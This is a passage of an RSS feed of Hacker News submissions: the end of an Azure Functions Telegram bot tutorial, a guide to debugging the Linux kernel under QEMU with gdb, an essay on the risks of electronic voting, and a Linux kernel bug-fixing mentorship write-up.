</code></pre></div><p>It’s very dirty, but for a quick test it’s OK, so please remember to remove all real keys from the code.</p><p>Then you can run a function just using the simple command:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-22.49.14-1024x709.png" alt="Azure Functions is running locally"></p><p>Good job! Now open your bot in Telegram and send any message. Our bot should copy it and resend to you:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-23.41.16.png" alt="Echo-Bot example"></p><h2 id="deploy-azure-function-to-the-portal">Deploy Azure Function to the portal</h2><p>To deploy Azure Function we just need to click on this button:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-22.52.40-1024x730.png" alt="Deploy Azure Function"></p><p>Then choose your resource and press “Deploy”. The process will be started:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-22.53.55-1024x406.png" alt="The process of deploying Azure Function"></p><p>After successful deployment, we need to go to Azure Portal and update <strong>WEBHOOK_ADDRESS</strong> and <strong>TELEGRAM_BOT_TOKEN</strong> variables with real values.</p><p>To get a real function URL, go to “Functions”, then choose your Azure Function and press “Get Function Url” button:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-23.05.24-1024x275.png" alt="How to get Azure Function URL"></p><p>We need to copy this value and paste to Application Settings along with Telegram Token:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-22.59.12-1024x343.png" alt="Application Settings in Azure"></p><p>After adding our secret keys, press “Save” and restart our application:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-23.09.41-1024x424.png" alt="Restart Azure application"></p><p>That’s all. Our bot should work in the cloud and you can track all function executions in real-time:</p><p><img src="http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/img/wp-content-uploads-2020-07-Screenshot-2020-07-13-at-23.13.07-1024x325.png" alt="Azure Dashboard"></p><p>Each function execution means that our bot handled 1 single message.</p><h2 id="conclusion">Conclusion</h2><p>In this tutorial, we have created an Azure Function with a simple Echo-Bot for Telegram. Azure Functions its a cool way to host your bots. You will be chargeable by the simple formula - (Memory size)X(Execution time in ms)X(Executions per month) and also remember that the first 400,000 GB/s of execution and 1,000,000 executions are free. If you need to estimate your pricing costs you can use <a href="https://azure.microsoft.com/en-us/pricing/calculator/">this pricing calculator</a>.</p><p>P.s. don’t forget to delete/clean/stop all resources.</p><p><a href="https://disqus.com/">comments powered by </a></p></div></div></section></div>]]>
            </description>
            <link>http://akhromieiev.com/tutorials/telegram-bot-azure-functions-and-node-js/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057328</guid>
            <pubDate>Wed, 11 Nov 2020 10:57:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Debugging the Kernel with QEMU]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057309">thread link</a>) | @__rompy
<br/>
November 11, 2020 | https://blog.k3170makan.com/2020/11/linux-kernel-exploitation-0x0-debugging.html | <a href="https://web.archive.org/web/*/https://blog.k3170makan.com/2020/11/linux-kernel-exploitation-0x0-debugging.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-4480419177723293408">
<p>Hi folks, in this post I'm going to walk through how to setup the linux kernel for debugging. I will also demonstrate that the setup works by setting a break-point to a test driver I wrote myself. All the code will be available from my gitlab, all the links to my gitlab will be re-posted at the end.&nbsp;</p><p>The setup I describe here re-uses some parts of the syzkaller setup, and for good reason later on in the post series I will break into a tutorial for the syzkaller tool as well. So lets get on with it.</p><table><tbody><tr><td><a href="https://1.bp.blogspot.com/-u2vPJD5mvfQ/X6v9Jig2QOI/AAAAAAAAQFA/AeLKhrX1BXM8HY7pN694qJFyvWDilFojACLcBGAsYHQ/s1109/Screenshot%2Bfrom%2B2020-11-11%2B17-00-44.png" imageanchor="1"><img data-original-height="625" data-original-width="1109" height="360" src="https://1.bp.blogspot.com/-u2vPJD5mvfQ/X6v9Jig2QOI/AAAAAAAAQFA/AeLKhrX1BXM8HY7pN694qJFyvWDilFojACLcBGAsYHQ/w640-h360/Screenshot%2Bfrom%2B2020-11-11%2B17-00-44.png" width="640"></a></td></tr><tr><td>Screenshot of a successful debug session with full debug symbols for the kernel! We can even see the call to start_kernel and a frame before that as well!<br></td></tr></tbody></table><br>&nbsp;<h2>The Process</h2><p>Okay so we want to study kernel exploitation but given that the kernel isn't something totally accessible in userspace, its not as convenient to debug as userpace stuff, we need a bit of a run up before we can actually poke and prod the kernel to figure out how to write our exploits. So there's a number of important steps to how we get this done, here's what we're going to do:</p><ol><li>Build a kernel</li><li>Build an image</li><li>Launch the virtual machine&nbsp;</li><li>Attach and setup the debugger</li><li>Building, loading and debugging a test module <br></li></ol><p>We also need to be able to build our kernel because there may be build options that are important to configure in order to control exploit protection or include modules and functionality to the kernel when needed. <br></p><h2>Building a Kernel</h2><p>Okay so before we get going with launching our Qemu instances and debugging modules we need an environment. For convenience sake I'm working off of a fresh Ubuntu 18.04.5 LTS machine. I'll document the processes from fresh install to first successful kernel build.</p><p>To start we need to make sure we have everything we need to build a kernel:</p><p><span>$<b>sudo apt-get update</b></span></p><p><span>$<b>sudo apt-get upgrade </b><br></span></p><p><span>$<b>sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison qemu-system-x86</b></span></p><p>Next we obviously need a kernel so lets download a brand new kernel:</p><p><span>$<b>wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.9.7.tar.xz</b><br>--2020-11-10 23:00:26--&nbsp; https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.9.7.tar.xz<br>Resolving cdn.kernel.org (cdn.kernel.org)... 151.101.225.176, 2a04:4e42:35::432<br>Connecting to cdn.kernel.org (cdn.kernel.org)|151.101.225.176|:443... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 115538096 (110M) [application/x-xz]<br>Saving to: ‘linux-5.9.7.tar.xz’<p>linux-5.9.7.tar.xz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 42%[=============&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ]&nbsp; 46.79M&nbsp; 3.08MB/s&nbsp;&nbsp;&nbsp; eta 23s&nbsp;&nbsp; &nbsp;</p></span></p><p><span>... <br></span></p><p><span>$<b>tar -xf linux-5.9.7.tar.xz</b></span></p><p>We're just a couple steps from sending the final build commands, before we get to that lets make sure the kernel config is ready to rock. Because we're working on a Linux host we can simply swipe the .config for the virtual machine's Ubuntu kernel like so:</p><p><span>$<b>cp /boot/config-5.4.0-52-generic .config</b></span></p><p>We then need to select some options that make debugging and exploit dev a little easier. First thing we need is to merge some options for making the kernel easier to run in a virtual machine:</p><p><span>$<b>make kvmconfig</b></span></p><p><span>Using .config as base<br>Merging ./kernel/configs/kvm_guest.config<br>#<br># merged configuration written to .config (needs make)<br>#</span></p><p><span>...</span></p><p>Great, now we need to enable some options for debug symbols, kaslr and other awesome things. So open the <span>.config</span> somewhere in a text editor and make sure you either add or modify the file so these options are set:</p><p><span>CONFIG_KCOV=y<br>CONFIG_DEBUG_INFO=y<br>CONFIG_KASAN=y<br>CONFIG_KASAN_INLINE=y<br>CONFIG_CONFIGFS_FS=y<br>CONFIG_SECURITYFS=y </span><br><span><span># CONFIG_RANDOMIZE_BASE is not set<br></span></span></p><p>Cool now we need to make sure the config is ready to go for a build:</p><p><span>$<b>make savedefconfig</b></span></p><p><span>$<b>make -j4</b></span></p><p><span>&nbsp;...</span></p><p>Now you should grab some coffee, play a startcraft2 game because this may take a while. Okay so if your build worked you should have an object file in the following location:</p><p><span>[kernel_dir]/arch/x86_64/boot/bzImage</span>&nbsp;</p><h2>Build an image</h2><p>We're going to build an image for this kernel so we might as well plop a "image" directory in this folder:</p><p><span>$<b>mkdir [kernel_dir]/image/</b></span></p><p>Once you're kernel is build we need to start thinking about how to build a file system for this. Here I'm going to cheat and steal some tips from the syzkaller folks. We need to first download syzkaller, as follows:</p><p><span>$<b>git clone https://github.com/google/syzkaller.git</b></span></p><p><span>Cloning into 'syzkaller'...<br>remote: Enumerating objects: 1, done.<br>remote: Counting objects: 100% (1/1), done.<br>...<br></span></p><p>Move back to the kernel build and setup an image:</p><p><span>$<b>cd [kernel_dir]/image/</b></span></p><p><span>$<b>cp [syzkaller_dir]/tools/create_image.sh .</b></span></p><p>Okay so we can now create an image, all we need to do is simply invoke create_image.sh:</p><p><span>$<b>./create_image.sh&nbsp;</b></span></p><p><span>+ DIR=chroot<br>+ PREINSTALL_PKGS=openssh-server,curl,tar,gcc,libc6-dev,time,strace,sudo,less,psmisc,selinux-utils,policycoreutils,checkpolicy,selinux-policy-default,firmware-atheros,python,xrdp,g++,make,libtool,autoconf,nasm<br>+ '[' -z ']'<br>+ ADD_PACKAGE=make,sysbench,git,vim,tmux,usbutils,tcpdump</span></p><p><span>...</span><br></p><p>If that worked you should have the following in your folder:</p><p><span>$<b>ls</b>&nbsp;</span></p><p><span>chroot/</span></p><p><span>create-image.sh</span></p><p><span>stretch.id_rsa</span></p><p><span>stretch.id_rsa.pub</span></p><p><span>stretch.img</span><br></p><h2>Launch the virtual machine <br></h2><p>Now we can launch qemu with all the goodies in place:</p><p><span>qemu-system-x86_64 \<br>&nbsp; -kernel <b>../arch/boot/x86_64/bzImage</b> \<br>&nbsp; -append "console=ttyS0 root=/dev/sda earlyprintk=serial nokaslr"\<br>&nbsp; -hda <b>./stretch.img</b> \<br>&nbsp; -net user,hostfwd=tcp::10021-:22 -net nic \<br>&nbsp; -enable-kvm \<br>&nbsp; -nographic \<br>&nbsp; -m 2G \<br>&nbsp; -s \<br>&nbsp; -S \<br>&nbsp; -smp 2 \<br>&nbsp; -pidfile vm.pid \<br>&nbsp; 2&gt;&amp;1 | tee vm.log</span></p><p><span>...</span></p><p><br>The <span>-s</span> is a shorthand for <span>-gdb tcp::1234</span>, which means the gdbserver will be hosted at port 1234. -S tells qemu not to start the cpu automatically, this gives us a chance to set a breakpoint before the kernel starts executing. </p><p>So that's the image running smoothly, lets setup our debugging environment.</p><h2>Attach and setup the debugger<br></h2><p>We can then attach a gdb debugger to the qemu instance as follows. On another terminal, separate from the one running your qemu instance, start up gdb and issue the following commands:</p><p><span>$<b>cd [kernel_dir]/image/ </b><br></span></p><p><span>$<b>gdb ../vmlinux<br></b></span></p><p><span>Reading symbols from ../vmlinux...</span></p><p><span>(gdb)<b> target remote :1234<br></b></span></p><p><span>Remote debugging using :1234<br>0x000000000000fff0 in exception_stacks ()<br></span></p><p><span>(gdb) <b>c</b></span></p><p>We give the "c" command to continue execution. We can now set some of our own breakpoints. As part of the tutorial I've included a custom IOCTL driver and app code (code that invokes the ioctl from userspace), i thought this would be nifty since it shows full ability to develope and debug a driver, something crucial to hunting down modern bugs and exploit development. Anyway lets code and build our own module.</p><h2>Building, Loading and debugging a test module<br></h2><p>Okay so we need to make a test ioctl driver, so lets head over the to kernel source directory and make a new folder in the /driver/ subfolder:</p><p><span>$</span><b><span>cd&nbsp; [kernel_dir]/drivers/</span></b></p><p><span>$</span><b><span>mkdir debug_driver/</span></b></p><p><span>$</span><b><span>cd debug_driver/ <br></span></b></p><p><span>$</span><b><span>touch debug_driver.c</span></b></p><p><span>$</span><b><span>touch debug_driver_app.c</span></b></p><p><span>$</span><b><span>touch Makefile</span></b></p><p>The code for <span>debug_driver.c</span> and <span>debug_driver_app.c </span>as we well as the <span>Makefile</span> are available at this repo <a href="https://gitlab.com/k3170makan/linux-kernel-exploit-development">https://gitlab.com/k3170makan/linux-kernel-exploit-development</a>. All you need to do is download the repo and stick this in its own folder under <span>[kernel_dir]/drivers/</span>. To build the module the we need to set the "M" variable in the kernel make script:</p><p><span>$<b>cd [kernel_dir]; make -C . M=drivers/debug_driver/</b></span></p><p><span>make: Entering directory '/home/kh3m/Research/Kernel/debug_image/linux-5.5.3'<br>&nbsp; AR&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; drivers/debug_driver//built-in.a<br>&nbsp; CC [M]&nbsp; drivers/debug_driver//debug_driver.o</span></p><p><span>...</span></p><p>Now we need to get this module on our qemu host somehow, I do this the hard way, I'm sure there's all sorts of nifty ways to scp files onto the qemu host but I actually just re-create the image after copying the drivers to a folder to be baked into the start up filesystem. First we need to edit create-image.sh so it includes everything in a folder we specify, that way we can just dump stuff in the folder and run create-image.sh whenever we want those files on a live instance.</p><p>So before create-image.sh builds the disk image on line 129, stick this in there:</p><p>++ <span>sudo cp -r ./add/* $DIR/home/.</span><br></p><p>now we make a "add" folder and stick the kernel module and app code in there:</p><p><span>$<b> cd [kernel_dir]/image/</b></span></p><p><span>$ <b>mkdir add/</b></span></p><p><span>$ <b>cd add/</b></span></p><p><span>$ <b>cp ../../drivers/debug_driver/debug_driver.ko .</b><br></span></p><p><span>$ <b>cp ../../drivers/debug_driver/debug_driver_app.c .</b></span></p><p><span>$ <b>./create-image.sh</b> </span></p><p>Okay so we have a module, we have a symbol file debug_driver.ko, with stuff we need to set breakpoints. Lets load the module into the kernel, then check where it gets loaded before we actually set the breakpoint:</p><p><span>root@syzkaller:$ <b>cd /home/</b></span></p><p><span>root@syzkaller:$ insmod debug_driver.ko</span></p><p><span> [&nbsp;&nbsp; 32.792570] audit: type=1400 audit(1605058227.605:7): avc:&nbsp; denied&nbsp; { module_load } for&nbsp; pid=249 comm="insmod" path="/home/debug_driver.ko" dev="sda" ino=21253 scontext=system_u:system_r:kernel_t:s0 1<br>[&nbsp;&nbsp; 32.793766] debug_driver: loading out-of-tree module taints kernel.<br>[&nbsp;&nbsp; 32.800394] [debug_driver] loaded! <br>[&nbsp;&nbsp; 32.800826] [debug_driver] device registered successfully<br>[&nbsp;&nbsp; 32.802298] [debug_driver] device has been successfully created <b><br></b></span></p><p>Before we can debug it properly we need to know where it is loaded in kernel memory:</p><p><span>root@syzkaller:/home# <b>cat /proc/modules</b> <br>debug_driver 16384 0 - Live <b>0xffffffffa0000000</b> (O)</span></p><p>Okay lets now set our breakpoint and load the symbol file using the base address of the module:</p><div><p><span>&nbsp;(gdb) <b>add-symbol-file ../drivers/debug_driver/debug_driver.ko&nbsp; 0xffffffffa0000000</b><br>add symbol table from file "../drivers/debug_driver/debug_driver.ko" at<br>&nbsp;&nbsp; &nbsp;.text_addr = 0xffffffffa0000000<br>(y or n) <b>y</b><br>Reading symbols from ../drivers/debug_driver/debug_driver.ko...<br>(gdb) <b>break dev_read</b><br>Breakpoint 1 at <b>0xffffffffa0000010: file drivers/debug_driver//debug_driver.c</b>, line 81.<br>(gdb) c</span></p></div><p>Cool lets execute the driver program so we can trigger the code we want:</p><p><span>root@syzkaller:$ <b>gcc -o debug_driver_app.elf debug_driver_app.c<br></b></span></p><p><span><span>root@syzkaller:/home# <b>./debug_driver_app.elf </b><br>Usage: ./debug_driver_app.elf [message to write] [read length] <br></span></span></p><p><span><span>root@syzkaller:</span>$ <b>./debug_driver_app.elf "hello" 10</b></span></p><p><span>[&nbsp; 160.083320] [debug_driver] message successfully copied message =&gt; [hello]<br>[&nbsp; 160.083326] [debug_driver] buffer copied to message holder<br>[debug_driv…</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.k3170makan.com/2020/11/linux-kernel-exploitation-0x0-debugging.html">https://blog.k3170makan.com/2020/11/linux-kernel-exploitation-0x0-debugging.html</a></em></p>]]>
            </description>
            <link>https://blog.k3170makan.com/2020/11/linux-kernel-exploitation-0x0-debugging.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057309</guid>
            <pubDate>Wed, 11 Nov 2020 10:53:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why electronic voting is dangerous]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057302">thread link</a>) | @ian_starts
<br/>
November 11, 2020 | https://blog.iankok.com/risk-electronic-voting | <a href="https://web.archive.org/web/*/https://blog.iankok.com/risk-electronic-voting">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>With the 2020 US elections having mail in ballots,
I found myself wondering if a digital solution would be safer, more reliable and easier. As usual the answer isn't straightforward. </p>
<p>In this post I'll talk you through some possible solutions and their potential downsides.</p>
<p>I will mostly focus on Dutch elections, seeing as I can provide the best insights, and most arguments are easily
transferable to other nations.</p>
<h2>Requirements</h2>
<p>If we would develop a voting system from scratch it would need to have some features that protect our rights and make
sure the elected ruler is the one the people really wanted (questionable if that's the case with current electoral systems, but that's for another time).</p>
<ol>
<li><strong>Accuracy</strong> - are all the votes counted, do they represent the will o' the people?</li>
<li><strong>Anonymity</strong> - very difficult this one. We don't want the votes to be signed, that would leave opportunities for
coercion and intimidation. However, we do need to verify that the voter is eligible to vote (or a real person at all for that matter).</li>
<li><strong>Verifiability</strong> - we need to be able to verify if the process went correctly.</li>
<li><strong>Speed</strong> - it would be useful if votes would be counted quicker. </li>
</ol>
<p>A big problem with anonymity and verifiability is that making votes anonymous makes them difficult to verify.</p>
<p>If we had a database with all the people who voted, and their cast vote, verifiability would be tackled. However, it wouldn't be anonymous.</p>
<h2>e-voting vs i-voting</h2>
<p>When discussing electronic voting there are essentially two things at play. </p>
<ol>
<li><strong>e-voting</strong> - voting on a machine on location. Like 35 municipalities did in the Netherlands between roughly 1970 and 2007.</li>
<li><strong>i-voting</strong> - voting online using a device connected to the internet.</li>
</ol>
<p>e-voting is usually seen as the easier one. You can tackle anonymity by submitting anonymous votes, and verify it
manually with a passport check before entering the voting booth.</p>
<p>i-voting is much more difficult, because you can't have the manual check.</p>
<h2>We can protect our back accounts, so how hard can protecting votes be, right?</h2>
<p>Well, unless you're part of a secret society with unlimited wealth, chances are your bank account is not a very interesting target.</p>
<p>The scale of an election is massive. The decision made there has so much influence,
that it's an incredibly high value target.</p>
<blockquote>
<p>Most hackers aren't hardcore geeks typing away on their kali linux distro. It's usually a game of
influencing people, leaked data or a weak password. This can be summarised as the <em>human error</em>.</p>
</blockquote>
<p>It's much more likely hackers will pour resources into hacking an election than a bank account.</p>
<h2>e-voting</h2>
<p>e-voting seems like a pretty good idea. it's pretty straight forward on an abstract level: keep everything the same, only make the counting digital.</p>
<p>Too bad it's an oversimplification. It's impossible for most voters to check how the system works internally.
Even if the voters were all programmers, the source code doesn't have to be open-source. There's no rule against making the source code private. </p>
<p>So basically, it's a black box which we have to trust with one of the most important things in a democracy, and impossible for any voter to check the process.</p>
<p>This fear is backed by a <a href="https://www.bundesverfassungsgericht.de/SharedDocs/Pressemitteilungen/EN/2009/bvg09-019.html">2009 decision</a> by the Federal Constitutional Court of Germany:</p>
<blockquote>
<p>The use of voting machines which electronically record the voters’ votes and electronically ascertain the election
result only meets the constitutional requirements if the essential steps of the voting and of the ascertainment of the
result can be examined reliably and without any specialist knowledge of the subject.  </p>
</blockquote>
<p>Beside these 'lack of control' fears, a lot of systems have failed miserably over the years.</p>
<p>The lack of pen-testing (inviting good-guy hackers to attack your system and check for vulnerabilities) makes it very hard to pinpoint exact failures, but here's a curated list of found problems in the US:</p>
<ul>
<li>2003 – In Fairfax, new voting machines either didn’t work, or would lose the voter’s choice after a few moments.</li>
<li>2003 – The State of Maryland found that the Diebold Election Systems, Inc. (now rebranded as Premier Election Solutions) AccuVote-TS system “as implemented in policy, procedure, and technology, is at high risk of compromise.”</li>
<li>2002-2006 – During this period, Election Systems and Software, the US’s leading voting machine manufacture was shipping some of its systems with remote access software, making them vulnerable to hacking.  </li>
<li>2006 – Researchers from the Voting Systems Technology Assessment Advisory Board (VSTAAB) and the University of California corroborated previous research that found various Diebold voting machines can have the votes on their memory cards tampered with in a way that cannot be detected. They found a number of other security vulnerabilities as well.</li>
<li>2006 – Princeton researchers studied the Diebold AccuVote-TS and found that it was vulnerable to a range of serious attacks. These included the possibility of malware installation which could be used to alter the vote.</li>
<li>2015 – The Virginia Information Technologies Agency assessed the WinVote machine, which is manufactured by Advanced Voting Solutions. The agency recommended discontinuing the use of these machines after they found a range of serious flaws such as weak passwords, outdated security protocols, and insufficient system hardening.</li>
<li>2018 – At DEFCON, J. Alex Halderman showed that Diebold AccuVote TSX voting machines could be manipulated remotely in a mock election. The same vulnerable machines were being used in 18 different states. After the event, a 50 page report was released, detailing vulnerabilities in Election Systems &amp; Software’s M650 machine and the Diebold AccuVote TSX. Together, these machines are used in as many as 23 states.</li>
<li>2018 – Some voters in Texas allege that the Hart InterCivic’s eSlate machine was switching their vote to another candidate in the state’s election for senator.</li>
</ul>
<p>And of course a Dutch problem:</p>
<ul>
<li>2007 - It was possible to read and analyse the Electromagnetic radiation of voting machines from dozens of meters away. This caused the anonymity to be completely compromised.</li>
</ul>
<p>Side-note; this was known before an election took place. Still, parts of the election were held with the voting machines,
causing the Dutch government to be sued, losing, and going back to paper ballots.</p>
<p>So yeah, e-voting; not perfect.</p>
<h2>Hopes for e-voting</h2>
<p>More recently there has been talk of re-instating e-voting with some big adaptations. </p>
<p>The new version would basically be a computer with a printer. You can cast your vote in a voting booth with no
connectivity to the web. The voting machine would print your vote on a piece of paper, which you can then check for errors and deposit in the voting box.
These printed votes are easily read by a central computer, making counting them a lot easier and quicker.</p>
<p>Though this seems like an interesting concept, it's also doesn't have a lot of benefits over paper ballots. As the software axiom goes "keep it simple, stupid",
this doesn't really comply.</p>
<h2>i-voting</h2>
<p>I-voting, also known as remote e-voting, is casting your vote from the comfort of your own couch.
The only country which implemented such a system is Estonia. With tech giants migrating more of your life to the internet,
it seems that it's only logical to move to i-voting. Let's take a look at Estonia. How their system works,
what the vulnerabilities are, and whether we should follow suit.</p>
<h3>How it works</h3>
<p>Estonia's i-voting system builds on their ID card. This ID card is also a smart card and allows owners to digitally
sign documents and facilitates secure authentication. This already laid infrastructure makes it possible to tackle one of our demands; <strong>verifiability</strong>.</p>
<p>The i-voting system is available in an early voting period (sixth day to fourth day prior to Election Day). You can
change your vote an unlimited amount of times in that timeframe. You can also overwrite your vote by going to a
polling station, invalidating your i-vote.</p>
<p>When this new voting method was first introduced, the president Arnold Rüütel challenged i-voting, claiming breach of the principle of equality of voting.
The president brought a petition against the e-voting provisions to Estonian Supreme Court but lost. Rüütel was mostly
popular amongst the still Russian speaking elderly minority. About 1.9% voted online in the
<a href="https://archive.is/20120713045721/http://news.com.com/Estonia+pulls+off+nationwide+Net+voting/2100-1028_3-5898115.html">2005 election</a>.
This has increased over the years to <a href="https://rk2019.valimised.ee/en/voting-result/voting-result-main.html">43.8% in 2019</a>.</p>
<p>Estonia also open-sourced much of their source code to make the system as transparent as possible. They haven't
released everything (annoying some critics). Most notably, all the client side code is missing (more in that later).</p>
<p>One of the biggest things going for i-voting is potentially increasing voter turnout, however that
claim has been <a href="https://core.ac.uk/download/pdf/95665595.pdf">mostly invalidated.</a></p>
<h3>Vulnerabilities</h3>
<p>One peer <a href="https://estoniaevoting.org/findings/paper/">reviewed research paper</a> claims the researchers could be able to
breach the system, change votes and vote totals, and erase any evidence of their actions if they could install
malware on the election servers. Now of course, it's basically impossible to breach the security of election servers.
However, circling back to human error; what if someone is bribed, careless, or just malicious? The stakes are immense,
and these edge cases can not be ignored.</p>
<p>Another gaping security hole is the personal device of the voter. This may be the weakest link in the chain.
The system is quite robust after the ballot has been cast. However, sending that ballot is not trivial. </p>
<p>It's easy to write a fake web client (hence the hidden source code. That would make it too easy),
tricking people into thinking they've already voted. Or a piece of malware, sending a different vote than you typed.</p>
<p>The Estonian National Electoral parried these criticisms, <a href="http://vvk.ee/valimiste-korraldamine/vvk-uudised/vabariigi-valimiskomisjoni-vastulause-the-guardianis-ilmunud-artiklile">claiming</a>
they "give us no reason to suspend online balloting". The purported vulnerabilities were said to be either not feasible in reality or already accounted for in the design of the e-voting system.</p>
<p>The Estonian Information System Authority also responded. Claiming the criticisms as a political, rather …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.iankok.com/risk-electronic-voting">https://blog.iankok.com/risk-electronic-voting</a></em></p>]]>
            </description>
            <link>https://blog.iankok.com/risk-electronic-voting</link>
            <guid isPermaLink="false">hacker-news-small-sites-25057302</guid>
            <pubDate>Wed, 11 Nov 2020 10:52:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Linux Kernel Bug Fixing Mentorship]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25057256">thread link</a>) | @janvdberg
<br/>
November 11, 2020 | https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship | <a href="https://web.archive.org/web/*/https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="634481719919165440">
                    
                        
                            <h3><a href="https://himadripandya.me/post/634481719919165440/linux-kernel-bug-fixing-mentorship">Linux Kernel Bug Fixing Mentorship</a></h3>
                        <p>I recently finished a three months long <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmentorship.lfx.linuxfoundation.org%2F&amp;t=ODEyOWYwYmViYjczZTZmZjE1M2Q1MDVhMTM3ZmNmM2RhMzI0MTgxMSxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605414214" target="_blank">CommunityBridge(now knows as LFX)</a> mentorship with <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.linuxfoundation.org%2F&amp;t=ODg0ZDA0Mjc5ZGQyNGQ5OWYxMGU1YzlkMTQ5YjIzY2E3MjFmODQ0YSxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605414214" target="_blank">The Linux Foundation</a>. I worked as a <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fmentorship.lfx.linuxfoundation.org%2Fproject%2Ff06db0d5-537e-4e0f-8ca4-0a471f95a04d&amp;t=ZjVkODE2OTczM2IyNDA5MWU1OWJlMTZkMzlkYmI4NDllYjVmY2ViOCxxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605414214" target="_blank">Linux kernel bug fixing</a> mentee under <a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fwww.kroah.com%2Flog%2Fabout.html&amp;t=NTk0MjQ1YWUyZWIxNzIwOWIxZWQxMzc0NDIyODZmYTQ3YjM2N2Y2NixxZFY2MWdBcQ%3D%3D&amp;b=t%3ADI8NpTL_CjWnBvVuPh5VJg&amp;p=https%3A%2F%2Fhimadripandya.me%2Fpost%2F634481719919165440%2Flinux-kernel-bug-fixing-mentorship&amp;m=1&amp;ts=1605414214" target="_blank">Greg Kroah-Hartman</a>. This post is about my experience and work during the mentorship program.</p><p>In
the first week of the mentorship program, I learned about debugging
techniques for the Linux kernel, how to use decode_stacktrace.sh, and
what is CONFIG_KASAN. These were all unfamiliar concepts for me, and
I found the mentors’ learning resources very useful. My first task
was to write summaries of my understanding of these concepts. I found
these summaries quite helpful while fixing real bugs in the kernel
later in the mentorship.</p><p>I
was also unfamiliar with syzkaller and syzbot before becoming part of
the mentorship. So after completing the summary tasks, I spent the
next few days getting familiar with these tools. The syzbot dashboard
has hundreds of reported bugs, and I found it a little challenging to
decide which one I should pick first.</p><p>In
the meantime, my mentor, Greg KH, redirected me towards an ongoing
discussion regarding a bug produced due to a short read in
usb_control_msg() call. There existed a few ways to fix it, and after
discussing them with the mentor, I proposed a fix. The patch
generated a fair amount of discussion, and I also received comments
that the proposed fix wasn’t the right way to handle the bug. The
discussion also concluded that many other usages of
usb_control_msg(), which don’t have proper error checks, are also
prone to similar bugs. I fixed the bug by adding an adequate error
check to prevent short reads in the caller, and Greg KH wrote new
wrapper functions for usb_control_msg() to be used in such scenarios
to avoid similar bugs.</p><p>Apart
from this bug, I also explored two other bugs. I found them
fascinating because inspite of being listed on the dashboard, their
reproducers weren’t triggering any issues. I learned that a commit
had fixed one of these bugs, and it was yet to be applied to all
kernel trees. But the other bug didn’t have any reported fix, yet the
reproducer wasn’t triggering the issue. I discussed this with the
mentor and learned that the syzbot dashboard isn’t quite dynamic. So
we decided to mark the bug as “invalid.” On a later
discussion with other community members I learned that it was not a
good idea, and I’ve ended up marking a potentially valid bug as
“invalid”!</p><p>As
a follow-up work on the first usb_control_msg() bug, I submitted a
cleanup patch series for some of the drivers/net/usb files. One of
those patches ignored the GFP_NOIO flag used in the original code and
replaced it with the GFP_KERNEL flag used in the new wrapper API
functions. It was a blunder that resulted in a discussion to add a
new argument for memory allocation flags in the wrapper functions.
